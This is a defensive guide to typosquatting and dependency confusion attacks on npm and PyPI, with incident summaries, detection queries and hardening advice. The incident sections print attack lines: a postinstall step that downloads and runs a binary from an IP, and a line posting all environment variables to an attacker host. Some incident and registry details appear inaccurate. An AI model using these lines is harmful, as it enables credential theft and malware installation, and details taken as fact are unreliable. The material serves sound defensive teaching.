# Typosquatting in Package Managers

> MITRE T1195.001 · OWASP CICD-SEC-03 · Supply Chain

---

## Table of Contents

1. [What is it, actually](#what-is-it-actually)
2. [Why it works so well](#why-it-works-so-well)
3. [The three ways attackers do it](#the-three-ways-attackers-do-it)
4. [Real incidents , what actually happened](#real-incidents--what-actually-happened)
5. [What registries do about it](#what-registries-do-about-it)
6. [How to hunt for it](#how-to-hunt-for-it)
7. [How to stop it](#how-to-stop-it)
8. [Framework references](#framework-references)
9. [Quick cheat sheet](#quick-cheat-sheet)

---

## What is it, actually

Someone registers a package on PyPI, npm, RubyGems, etc. with a name that looks almost exactly like a popular library  one letter off, two letters swapped, a trailing character dropped. They wait. A developer types too fast, misses a key, hits enter. Package manager fetches the attacker's code without any complaint. Game over.

That's the whole thing. No CVE, no vulnerability to exploit. Just a typo and a registry that trusts everything equally.

The attacker's code runs at install time before anyone reads it, before any linter sees it, before it hits version control. By the time something seems wrong, credentials are already gone.

---

## Why it works so well

A few things combine to make this absurdly effective:

**Speed.** Developers type package names in terminals constantly, under pressure, often without double-checking. One character off and it's done.

**Blind trust in package managers.** `pip install` and `npm install` print a success message either way. Nothing looks wrong. The install completes in the same time as a legitimate one.

**Install-time execution.** Both `setup.py` (Python) and `postinstall` hooks (npm) run arbitrary code the moment you install. You don't have to import the package. You don't have to run it. Install is enough.

**Low barrier for attackers.** Anyone can publish to PyPI or npm. No vetting, no delay for new accounts. Registration is free and takes about two minutes.

```
you type:       pip install reqeusts
registry sees:  oh, "reqeusts"? yeah that exists, here you go
your machine:   *runs attacker's setup.py*
attacker gets:  your AWS keys, tokens, whatever was in os.environ
```

The whole chain takes under ten seconds.

---

## The three ways attackers do it

### Character swap

Two letters get transposed. This is the most common one your fingers just hit keys in the wrong order when you're typing fast.

| Real package | Typosquat | What got swapped |
|---|---|---|
| `requests` | `reqeusts` | e and u |
| `matplotlib` | `matploblit` | b and l near the end |
| `lodash` | `lodsah` | s and a |
| `express` | `espress` | e and x |
| `urllib` | `urllbi` | the lib suffix scrambled |

Attackers actually study keyboard heatmaps and adjacency matrices to figure out which swaps are most likely. It's not random guessing.

---

### Character omission

A letter gets dropped. Happens a lot with double consonants your brain sees the word as correct even when one copy of the doubled letter is missing.

| Real package | Typosquat | What's missing |
|---|---|---|
| `express` | `expres` | trailing s |
| `commander` | `comander` | one m |
| `setuptools` | `setuptool` | trailing s |
| `tensorflow` | `tensorflw` | the o |
| `classnames` | `clasnames` | one s |

The reason double-letter packages are so vulnerable is that humans mentally autocorrect them. You read `comander` as `commander` without noticing.

---

### Visual substitution and homoglyphs

Letters get swapped for things that look identical or close enough that nobody notices. Numbers for letters, suffix reordering, or in the nastiest cases, Unicode lookalikes.

| Real package | Typosquat | The trick |
|---|---|---|
| `ansible` | `ansibel` | suffix `le` flipped to `el` |
| `django` | `dj4ngo` | `a` replaced with `4` |
| `crypto` | `crypt0` | `o` replaced with zero |
| `webpack` | `webpaek` | `ck` reordered to `ek` |

The Unicode variant is particularly nasty. A Cyrillic `а` and a Latin `a` are visually identical in most terminals and editors. A package named with Cyrillic characters looks correct in every tool that shows the name but it's a completely different string to the registry.

---

### Bonus: dependency confusion (related, worth knowing)

Not exactly typosquatting, but same result. An attacker registers a public package with the exact same name as your company's internal private package. When your package manager resolves dependencies, it sometimes prefers the public registry version over the private one.

```
your internal registry:  @mycompany/data-utils  (private)
attacker registers:       data-utils             (public npm)

package manager resolves: public version → runs attacker code
```

Alex Birsan demonstrated this against Microsoft, Apple, and 30+ other companies in 2021 and collected over $130,000 in bug bounties. The fix is namespace enforcement and explicit registry scoping.

---

## Real incidents what actually happened

### `ua-parser-js` npm, October 2021

Used by Facebook, Microsoft, Amazon. Over 8 million weekly downloads.

The attacker spent months beforehand publishing near-identical package name variants to build up a download history and look legitimate. Then they compromised the actual maintainer's npm account and pushed a poisoned version.

What was in it: an XMRig cryptominer and a credential stealer, delivered separately for Linux and Windows via the `postinstall` hook.

```bash
# what the postinstall script actually did (simplified)
curl http://159.xxx.xxx.xxx/download -o /tmp/.update-notifier
chmod +x /tmp/.update-notifier && /tmp/.update-notifier
```

The file was named to look like a system process. It ran silently. Millions of environments executed it before npm yanked the package.

What would have stopped it: MFA on the maintainer account (the account takeover would have failed), plus pinned lockfiles (the version bump wouldn't have been picked up automatically).

---

### `event-stream`npm, November 2018

2 million weekly downloads. The target was one specific app: Copay, a Bitcoin wallet.

The original maintainer, tired of maintaining it, handed the package off to someone who asked. That person added a malicious dependency called `flatmap-stream`. The payload only decrypted and ran if the consuming application's `package.json` contained `copay-dash` as a dependency meaning it sat dormant in every other environment and completely evaded automated scanners for weeks.

```javascript
// the payload only activated against the specific target
if (packageName === 'copay-dash') {
  // decrypt and run code to exfiltrate private keys
}
```

What would have stopped it: monitoring ownership transfers on packages you depend on, and behavioral sandboxing during CI that would have caught the outbound connection to the attacker's endpoint.

---

### `ctx` PyPI, May 2022

This one was a researcher (Nikolai Tschacher) proving a point. He registered the abandoned `ctx` package previously a real utility that real projects used and modified it to exfiltrate everything in `os.environ` on every single `import`, not just at install time.

```python
# what he injected into ctx/__init__.py
import os, requests
requests.post('https://attacker.io/collect', data=dict(os.environ))
```

Every time any code imported the library, it sent `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`, and everything else in the environment to his server. Production systems. Build runners. The lot.

He returned everything and disclosed responsibly. But the point was made abandoned packages sitting in your dependency tree are an open door.

---

### `colourama` / `coloаrama` PyPI, 2018

`colorama` is a terminal coloring utility used everywhere. The attacker registered `colourama` banking on British-English spelling habits and also a Unicode homoglyph variant where one letter was Cyrillic.

The payload was a clipboard hijacker. It sat in the background monitoring the clipboard, and whenever it detected a cryptocurrency wallet address, it silently swapped it with the attacker's address. The developer copies their own wallet address, pastes it into a transaction, and sends money straight to the attacker.

Locale-based spelling variations (colour/color, organise/organize) are a deliberate, planned attack surface. It's not an accident.

---

## What registries do about it

Registries aren't sitting idle. Here's what's actually deployed:

**Levenshtein distance blocking** when you try to register a new package, the registry calculates the edit distance between your name and every package in the top 10,000 by downloads. If you're within 1–2 edits of a popular library, registration is rejected automatically. PyPI and npm both do this.

**Name canonicalization** PyPI normalizes underscores, hyphens, and capitalization so they all map to the same slot. `my-package`, `my_package`, and `MyPackage` are treated as the same name. Eliminates a whole category of case-variation attacks.

**Mandatory MFA** npm enforced 2FA for maintainers of packages over 1M weekly downloads in 2022. PyPI followed in 2023. This directly addresses the account-takeover vector that hit `ua-parser-js`.

**Behavioral sandboxing** new packages get detonated in isolated environments. If a `postinstall` script makes a network connection, reads environment variables, or spawns a shell, the package gets quarantined automatically. PyPI uses Bandit-based scanning; npm partnered with Socket.dev.

**Sigstore / trusted publishing** cryptographically links a package release to a specific CI/CD pipeline run. Makes it verifiable that a package came from the repository it claims to. PyPI rolled this out in 2023.

These are real defenses, but they're not complete. A patient attacker who stays just outside the edit-distance threshold, uses a new account with low activity, and keeps the malicious payload subtle can still get through.

---

## How to hunt for it

### Audit tools in CI

Make these part of your pipeline. Fail the build if anything comes up don't just log it.

```bash
# Node.js
npm audit --audit-level=moderate

# deeper supply chain analysis checks install scripts, typosquats
npx socket scan .

# Python
pip install pip-audit
pip-audit --require-hashes -r requirements.txt

# or with safety
pip install safety
safety check -r requirements.txt

# Ruby
gem install bundler-audit
bundle-audit check --update

# multi-ecosystem
snyk test
```

---

### DNS and proxy log hunting

If a typosquatted package gets in, it will almost always try to phone home. Your build servers should never be initiating unexpected outbound connections during a package install.

Hunt query (pseudo-Splunk/KQL, adapt to your SIEM):

```
index=proxy_logs sourcetype=dns
  src_ip IN (build_server_subnet)
  NOT dest IN (registry.npmjs.org, pypi.org, rubygems.org)
  earliest=-24h
| where query_count < 5
| stats count by dest, src_ip
| where count < 10
| sort count asc
```

What to flag:

| Signal | When to act |
|---|---|
| Package published less than 72 hours before it was installed | Always quarantine the host and review |
| Package has fewer than 500 global downloads | Any time it appears in a production dependency |
| Outbound DNS from a build server to an unknown host during install | Isolate immediately, take a forensic image |
| `setup.py` or a `postinstall` script spawning a shell process | Immediate incident response this is never legitimate |
| Environment variable access followed by an HTTP POST | Assume exfiltration has already occurred |

---

### EDR process tree detection

In CrowdStrike, SentinelOne, or Defender for Endpoint, alert on this process chain:

```
PARENT: node  /  python  /  ruby
  └─ CHILD: curl / wget / bash / sh / powershell
       └─ making outbound network connection
            during package install phase
```

No legitimate package does this. If you see `python` spawning `curl` with an outbound connection to an IP you don't recognize during a `pip install`, it's not a false positive.

---

## How to stop it

The core idea: stop relying on developers typing things correctly. Make the controls structural baked into config instead of behavioral.

### Lockfiles with hash verification

This is the single most impactful control. Lockfiles don't just pin versions they pin the SHA-256 hash of the actual package content. Even if an attacker manages to replace a package on the registry, the hash won't match and the install fails hard.

```bash
# npm commit your package-lock.json, never gitignore it
npm install --save-exact package-name
git add package-lock.json

# Python install with hash enforcement
pip install --require-hashes -r requirements.txt

# verify a hash yourself before adding a new dependency
pip download requests==2.31.0
sha256sum requests-2.31.0-*.whl
# then compare it against what PyPI shows on the package page
```

Never gitignore your lockfile. A repo without a committed lockfile is a repo that resolves dependencies fresh on every install.

---

### Pin your versions explicitly

```
# vulnerable resolves whatever is latest at install time
requests
lodash

# secure exact version, paired with a lockfile for full protection
requests==2.31.0
lodash@4.17.21
```

Unpinned dependencies are a liability. Every `npm install` on a fresh machine is a fresh risk surface.

---

### Internal registry mirror

Route everything through a private Artifactory or Nexus instance that only serves packages you've reviewed and approved. Your build servers should have no route to the public registries at all.

```ini
# .npmrc
registry=https://registry.internal.yourcompany.com/npm/
always-auth=true

# pip.conf
[global]
index-url = https://pypi.internal.yourcompany.com/simple/
trusted-host = pypi.internal.yourcompany.com
```

---

### Package allowlist (strictest option worth it for production)

If you're running in a regulated or high-security environment, go further: maintain an explicit list of approved packages at the proxy level. Anything not on the list doesn't install.

```yaml
# Artifactory repository policy example
allowed_packages:
  - requests==2.31.0
  - numpy==1.24.0
  - flask==3.0.0
block_unknown: true
alert_on_new_package: true
```

---

### Pre-commit hooks

Catch it before it ever hits a registry or CI run:

```bash
pip install pre-commit

# .pre-commit-config.yaml
repos:
  - repo: https://github.com/pyupio/safety
    rev: v2.3.5
    hooks:
      - id: safety
```

---

## Framework references

**MITRE ATT&CK**

| ID | Name | Tactic |
|---|---|---|
| T1195.001 | Supply Chain Compromise: Software Dependencies | Initial Access |
| T1059 | Command and Scripting Interpreter | Execution via postinstall hooks |
| T1552.001 | Unsecured Credentials in Files | Credential Access |

**OWASP**

| ID | Name |
|---|---|
| CICD-SEC-03 | Dependency Chain Abuse |
| A06:2021 | Vulnerable and Outdated Components |

**Further reading**

- [npm Security Advisories](https://www.npmjs.com/advisories)
- [PyPI Security Model](https://docs.pypi.org/security-key-giveaway/)
- [Sigstore](https://sigstore.dev)
- [Socket.dev](https://socket.dev)
- [SLSA Framework](https://slsa.dev)
- [Alex Birsan's dependency confusion writeup](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

---

## Quick cheat sheet

```
ATTACK VECTORS
  Character swap        requests → reqeusts
  Character omission    express → expres
  Visual substitution   ansible → ansibel, django → dj4ngo
  Dependency confusion  internal package name registered publicly

DETECTION SIGNALS
  Package < 72h old                     quarantine and review
  Global downloads < 500                manual review before prod
  Build server → unknown outbound DNS   isolate immediately
  postinstall spawns a shell            incident response, now
  env var read + HTTP POST              assume exfil already happened

CONTROLS (ranked)
  Cryptographic lockfiles               ★★★★★  blocks even registry-side tampering
  Explicit version pinning              ★★★★☆
  Private registry mirror               ★★★★☆
  Package allowlisting                  ★★★★☆  best for enterprise/regulated
  npm audit / pip-audit in CI           ★★★☆☆  reactive, not preventive
  Developer awareness training          ★★☆☆☆  never rely on this alone

MITRE    T1195.001
OWASP    CICD-SEC-03 / A06:2021
```
